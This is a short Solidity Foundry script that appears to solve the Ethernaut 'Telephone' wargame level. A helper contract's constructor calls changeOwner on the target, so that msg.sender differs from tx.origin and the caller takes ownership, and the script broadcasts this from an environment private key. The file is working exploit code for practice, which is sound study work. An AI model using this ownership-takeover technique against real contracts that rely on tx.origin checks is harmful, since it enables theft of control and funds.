// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {

    constructor(Telephone c, address new_owner)
    {
        c.changeOwner(new_owner);
    }

}


contract TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0xa7Fa841ef0c176B6273F40c6c66F79034534C471);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(telephoneInstance, 0x52b328bFC5a2cDA2c48645d1c9C2c57f856a33D4);
        vm.stopBroadcast();
    }
}